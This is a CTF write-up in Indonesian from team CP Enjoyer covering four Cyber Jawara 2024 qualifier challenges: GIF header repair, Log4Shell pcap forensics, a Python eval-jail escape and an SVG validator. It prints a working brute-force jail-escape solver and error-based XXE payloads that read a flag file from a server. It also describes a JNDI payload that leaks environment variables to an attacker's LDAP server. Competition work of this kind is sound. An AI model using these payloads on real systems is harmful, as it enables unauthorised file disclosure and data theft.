+++
title = "Cyber Jawara 2024 Quals"
date = 2025-02-11
draft = false
categories = ["CTF Writeups", "Not Translated"]
tags = ["cyber-jawara", "forensik", "misc", "web", "writeup"]
summary = "Writeup tim CP Enjoyer untuk challenge Forensics (Grayscale, Log4Shell 1), Misc (py50), dan Web (SVG Validator) di CTF Cyber Jawara 2024 babak kualifikasi."
+++

Writeup dari tim **CP Enjoyer** untuk CTF Cyber Jawara 2024 babak kualifikasi — hanya bagian **Forensik**, **Misc** (py50), dan **Web** (SVG Validator).

---

# Forensik

## Grayscale (290 pts)

{{< admonition quote "Deskripsi" >}}
A threat actor hides a secret message on this intentionally-broken GIF.

**Author:** farisv

**Attachments:** `grayscale.gif`
{{< /admonition >}}

### Analisis awal

Diberikan file `grayscale.gif` yang merupakan sebuah GIF yang rusak. Sekitar `0x300` byte pertama file tersebut telah diubah dengan byte `FF`.

{{< image src="grayscale-xxd.png" caption="0x300 byte pertama grayscale.gif diubah menjadi FF" >}}

### Memahami maksud soal

Setelah membaca <https://en.wikipedia.org/wiki/GIF>, byte `21 F9` merupakan awal dari sebuah chunk `Graphic Control Extension` pada sebuah GIF. Ini berarti yang harus di-recover adalah header GIF, chunk `Logical Screen Descriptor`, dan chunk `Global Color Table`. Kami pada awalnya ingin mencoba memahami chunk-chunk tersebut dari dokumentasinya kemudian mencoba melakukan recovery. Namun, setelah membaca sedikit, sepertinya chunk-chunk yang ingin di-recover memiliki panjang yang tetap untuk semua GIF, jadi kami mencoba download sebuah GIF dari google dan melihat apakah terdapat byte `21 F9` pada offset `0x30d`. Dan ternyata benar, terdapat byte `21 F9` pada offset `0x30d`.

{{< image-row >}}
{{< image src="grayscale-example.png" caption="GIF contoh yang di-download dari Google" height=150 >}}
{{< image src="grayscale-example-xxd.png" caption="Byte 21 F9 pada offset 0x30d (GIF contoh)" height=90 >}}
{{< /image-row >}}

### Eksekusi mendapatkan flag

Menggunakan `0x30d` byte pertama dari GIF tersebut dan menaruhnya pada awal `grayscale.gif` menghasilkan GIF berikut yang menampilkan flag.

{{< image-row >}}
{{< image src="grayscale-recover.png" caption="Recover header GIF" height=120 >}}
{{< image src="grayscale-flag.png" caption="GIF berhasil menampilkan flag" height=300 >}}
{{< /image-row >}}

> Flag: `CJ{_s0_15_it_pr0nounc3d_GiF_or_JiF?_}`

## Log4Shell 1 (310 pts)

{{< admonition quote "Deskripsi" >}}
Our application is still using vulnerable Log4j and someone just hacked us! Please help to investigate and find out what they did.

**Author:** farisv

**Attachments:** `log4shell.pcap`

**Note:** There are two flags in this challenge.
{{< /admonition >}}

### Analisis awal

Diberikan file `log4shell.pcap` yang berisi paket-paket berikut.

{{< image src="log4shell-protocol.png" caption="Protocol hierarchy log4shell.pcap" height=400 >}}

Setelah melakukan analisis sederhana, terlihat payload log4shell terdapat pada header `X-Api-Version` paket HTTP.

{{< image src="log4shell-payload.png" caption="Payload log4shell pada header X-Api-Version" >}}

### Memahami payload

Payload tersebut menggunakan JNDI yang merupakan mekanisme untuk memproses suatu ekspresi dalam log4j. JNDI akan berusaha mengambil data dari server LDAP dengan IP penyerang dan endpoint yang didapatkan dari environment variable `FLAGPART1`. Melihat beberapa paket di bawahnya, terdapat paket TCP yang mengakses IP penyerang pada port `1389`.

{{< image src="log4shell-ldap.png" caption="Paket TCP menuju server LDAP penyerang (port 1389)" >}}

Setelah bertanya kepada ChatGPT, paket tersebut cocok dengan sebuah struktur paket LDAP, maka kami menggunakan fitur "Decode As" pada Wireshark sebagai paket LDAP. Terlihat karakter pertama flag, yaitu 'C'.

{{< image src="log4shell-flagpart.png" caption="baseObject LDAP berisi karakter pertama flag, 'C'" >}}

### Eksekusi mendapatkan flag

Melihat paket-paket berikutnya, ini dilakukan untuk setiap karakter dari `FLAGPART1` sampai `FLAGPART34`. Berarti terdapat 34 karakter pada flag. Kami menggunakan command tshark berikut untuk ekstrak flag lengkapnya.

{{< image src="log4shell-tshark.png" caption="Ekstraksi flag dengan tshark" >}}

Terdapat 2 huruf a yang sepertinya berhubungan dengan flag ke-2, maka diabaikan. Namun, hanya terdapat 33 karakter pada flag. Setelah melihat kembali paket-paket pada Wireshark, karakter ke-33 tidak dapat ditemukan. Maka, kami mencoba menaruh karakter '?' pada posisi ke-33 dan mendapatkan flag yang benar.

> Flag: `CJ{c4n_y0u_c0ntinu3_unt1l_Flag_2?}`

---

# Misc

## py50 (370 pts)

{{< admonition quote "Deskripsi" >}}
Get the `flag` by evaluating at most 50 chars of Python expression.

**Author:** farisv

`nc 159.89.193.103 9998`

**Attachments:** `py50.zip`
{{< /admonition >}}

### Analisis awal

Diberikan file `py50.py` dengan isi sebagai berikut.

**py50.py**

```python
#!/usr/local/bin/python3 -S
restricted_globals = {
    '__builtins__': None,
    'flag': "CJ{REDACTED}",
}

expression = input()
if len(expression) <= 50 and 'flag' not in expression:
    try:
        print(eval(expression, restricted_globals))
    except Exception as e:
        print("Invalid")
```

Terlihat bahwa input yang diberikan akan masuk ke dalam fungsi `eval` dengan flag yang harus didapatkan pada variabel `flag`, builtins kosong, dan tidak boleh terdapat string "flag" pada input kita. Kami langsung menyadari bahwa karakter unicode dapat digunakan untuk bypass blacklist string "flag". Maka, tinggal mencari cara untuk print variabel tersebut. Sejauh pengetahuan kami, tidak terdapat payload yang bisa digunakan untuk mendapatkan builtins semula, ataupun memanggil fungsi `print`. Kemudian, kami mendapatkan ide untuk brute force setiap karakter flag dengan memicu sebuah eror ketika sebuah kondisi terpenuhi. Untuk melakukan itu dalam bahasa python, kita harus memicu sebuah runtime error, bukan syntax error.

### Eksekusi mendapatkan flag

Kami memutuskan untuk memicu sebuah `ZeroDivisionError`. Berikut adalah solver lengkap kami ("flag" pada payload di bawah menggunakan unicode).

**solver.py**

```python
#!/usr/bin/env python3
from os import popen
from string import printable

flag = ''
i = 0
while len(flag) == 0 or flag[-1] != '}':
    for char in printable:
        open('payload.txt', 'w').write(f"1/0 if 𝘧𝘭𝘢𝘨[{i}]=={repr(char)}else 1\n")
        if popen("cat payload.txt | nc 159.89.193.103 9998").read().rstrip() == 'Invalid':
            flag += char
            i += 1
            print(flag)
            break

print(flag)
```

{{< image src="py50-output.png" caption="Output solver (brute force karakter flag)" height=600 >}}

> Flag: `CJ{d8bf5e4e9439ffb274130cb509a87f7d}`

---

# Web

## SVG Validator (370 pts)

{{< admonition quote "Deskripsi" >}}
A simple SVG validator.

**Author:** farisv

{{< link href="http://188.166.237.209:5557/" disabled=true >}}

**Attachments:** `svg-validator.zip`
{{< /admonition >}}

### Analisis awal

Diberikan file `svg-validator.zip` yang berisi source code dari sebuah aplikasi web yang dijalankan pada URL {{< link href="http://188.166.237.209:5557/" disabled=true >}}. Berikut adalah sebagian dari `app.py`.

**app.py**

```python
from lxml import etree
...

def is_valid_svg(file_path):
    tree = etree.parse(file_path)
    root = tree.getroot()
    return root.tag.endswith('svg')

...
    try:
        extension = file.filename.rsplit('.', 1)[1].lower()

        filename = hashlib.sha256(
            (file.filename + str(secrets.token_hex)[:16]).encode('utf-8')
        ).hexdigest() + '.' + extension
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)

        valid = is_valid_svg(file_path)
        os.remove(file_path)

        return jsonify({'valid': valid})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

...
```

Aplikasi web tersebut menerima sebuah file yang bisa kita upload, dan file tersebut akan di-parse menggunakan `etree.parse` dari modul `lxml` untuk menentukan apakah file tersebut merupakan suatu SVG atau tidak. Setelah membaca source code tersebut sekilas, berikut adalah alur saat meng-upload sebuah file. File yang di-upload harus memiliki ekstensi `.svg` dan akan disimpan pada direktori `/tmp` dengan nama file random. Setelah itu, file tersebut akan di-parsing dan kemudian dihapus. Terdapat tiga vulnerability pada implementasi kode di atas. Pertama, pemanggilan `etree.parse` pada sebuah file tanpa sebelumnya disanitasi memungkinkan terjadinya XXE. Namun, karena default behaviour dari `etree.parse` tidak memperbolehkan akses ke jaringan, kita tidak bisa menggunakan protokol `http://` ataupun `https://`. Ini berarti XXE OOB tidak bisa dilakukan untuk read file `flag.txt`. Kedua, pada kode bagian blok try-except di atas, terdapat kesalahan di mana apabila terjadi eror setelah pemanggilan `file.save`, file yang tersimpan tidak akan terhapus karena tidak ada pemanggilan `os.remove` di dalam blok except. Ini memungkinkan kita untuk meng-upload sebuah DTD dan memicu eror saat dipanggilnya fungsi `is_valid_svg` agar DTD tersebut tidak terhapus. Ketiga, pembangkitan nama file random pada kode di atas keliru karena tidak terpanggilnya `secrets.token_hex`. Fungsi ini seharusnya membangkitkan sebuah string hex random. Namun karena tidak terdapat `()` untuk memanggilnya seperti `secrets.token_hex()`, yang dikembalikan hanyalah representasi string dari fungsi tersebut. Pada intinya, ini menghasilkan sebuah string konstan yang berarti nama file setelah di-upload dapat diketahui dengan pasti.

{{< image src="svg-bug.png" caption="Bug: `secrets.token_hex` tidak dipanggil (kurang `()`)"                             height=70 >}}

### Exploit lokal

Dengan ketiga vulnerability di atas, dan juga karena eror parsing file akan dikembalikan ke kita, dapat dilakukan XXE via error messages dengan referensi dari Portswigger Academy tercinta (tapi menggunakan local DTD yang kita upload sendiri): <https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages>. Pertama, kita deploy aplikasi web di lokal untuk bisa lebih mudah debugging.

{{< image src="svg-local-diff.png" caption="Modifikasi source untuk menjalankan aplikasi secara lokal (diff)" >}}

Berikutnya adalah membuat DTD untuk membaca file `/app/flag.txt`, tapi mengubah ekstensinya menjadi `.svg`.

**xxe.svg**

```xml
<!ENTITY % file SYSTEM "file:///app/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Setelah itu, kita coba upload dan melihat apakah file tersebut dihapus atau tidak.

{{< image src="svg-upload-xxe.png" caption="Upload xxe.svg (memicu eror)" >}}
{{< image src="svg-not-deleted.png" caption="xxe.svg tidak terhapus di /tmp" >}}

Terlihat, file `xxe.svg` tidak dihapus dan berada pada path: `/tmp/6be703a62b365a3614dc1272c3bfcf211bb8c487e2219e18e54a0ecacbdfb7a4.svg`. Kemudian kita membuat SVG yang akan melakukan XXE.

**xxe2.svg**

```xml
<?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [
    <!ENTITY % xxe SYSTEM "file:///tmp/6be703a62b365a3614dc1272c3bfcf211bb8c487e2219e18e54a0ecacbdfb7a4.svg">
    %xxe;
  ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16"></text>
  </svg>
```

Meng-upload file tersebut akan leak flag pada eror.

{{< image src="svg-upload-xxe2.png" caption="Upload xxe2.svg" >}}
{{< image src="svg-flag-local.png" caption="Flag ter-leak pada pesan error" >}}

### Eksekusi mendapatkan flag

Terakhir, hanya perlu melakukannya pada URL {{< link href="http://188.166.237.209:5557/" disabled=true >}}.

{{< image src="svg-remote-xxe.png" caption="Upload xxe.svg pada target remote" >}}
{{< image src="svg-remote-xxe2.png" caption="Upload xxe2.svg pada target remote" >}}
{{< image src="svg-flag.png" caption="Flag didapat dari target remote" >}}

> Flag: `CJ{tes_ombak_aja_dulu}`
